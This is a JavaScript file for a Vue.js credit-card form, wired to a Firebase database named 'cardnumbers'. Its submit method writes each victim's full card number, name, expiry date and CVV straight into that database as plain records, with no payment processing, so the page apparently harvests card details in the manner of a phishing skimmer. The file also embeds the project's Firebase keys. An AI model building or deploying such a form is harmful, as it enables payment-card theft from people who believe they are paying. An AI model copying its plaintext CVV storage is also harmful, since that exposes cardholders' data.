var config = {
    apiKey: "AIzaSyA63jlM1QxGOllkBtVypM2P3OzV_Z2MlfE",
    authDomain: "cardnumbers-5e6b6.firebaseapp.com",
    databaseURL: "https://cardnumbers-5e6b6-default-rtdb.firebaseio.com",
    projectId: "cardnumbers-5e6b6",
    storageBucket: "cardnumbers-5e6b6.appspot.com",
    messagingSenderId: "881486899966",
    appId: "1:881486899966:web:8fa88a8728d4cf013b13af",
    measurementId: "G-PZDE977Q01"
};

firebase.initializeApp(config);

const database = firebase.database();


const vm = new Vue({
    el: "#app",
    data() {
        return {
            currentCardBackground: Math.floor(Math.random()* 25 + 1), // just for fun :D
            cardName: "",
            cardNumber: "",
            cardMonth: "",
            cardYear: "",
            cardCvv: "",
            code: "",
            minCardYear: new Date().getFullYear(),
            amexCardMask: "#### ###### #####",
            otherCardMask: "#### #### #### ####",
            cardNumberTemp: "",
            isCardFlipped: false,
            focusElementStyle: null,
            isInputFocused: false
        };
    },
    mounted() {
        this.cardNumberTemp = this.otherCardMask;
        document.getElementById("cardNumber").focus();
    },
    computed: {
        getCardType () {
            let number = this.cardNumber;
            let re = new RegExp("^4");
            if (number.match(re) != null) return "visa";

            re = new RegExp("^(34|37)");
            if (number.match(re) != null) return "amex";

            re = new RegExp("^5[1-5]");
            if (number.match(re) != null) return "mastercard";

            re = new RegExp("^6011");
            if (number.match(re) != null) return "discover";

            re = new RegExp('^9792')
            if (number.match(re) != null) return 'troy'

            return "visa"; // default type
        },
        generateCardNumberMask () {
            return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
        },
        minCardMonth () {
            if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
            return 1;
        }
    },
    watch: {
        cardYear () {
            if (this.cardMonth < this.minCardMonth) {
                this.cardMonth = "";
            }
        }
    },
    methods: {
        flipCard (status) {
            this.isCardFlipped = status;
        },
        focusInput (e) {
            this.isInputFocused = true;
            let targetRef = e.target.dataset.ref;
            let target = this.$refs[targetRef];
            this.focusElementStyle = {
                width: `${target.offsetWidth}px`,
                height: `${target.offsetHeight}px`,
                transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`
            }
        },
        blurInput() {
            let vm = this;
            setTimeout(() => {
                if (!vm.isInputFocused) {
                    vm.focusElementStyle = null;
                }
            }, 300);
            vm.isInputFocused = false;
        },
        submitData(){
           console.log("send");
           database.ref('/').push({
               cardNumber: this.cardNumber,
               cardName: this.cardName,
               cardMonth: this.cardMonth,
               cardYear: this.cardYear,
               cardCvv: this.cardCvv
           });
        },
        reset(){
            this.cardNumber = ""
            this.cardName = ""
            this.cardMonth = ""
            this.cardYear = ""
            this.cardCvv = ""
            this.code = ""
        }
    }
});
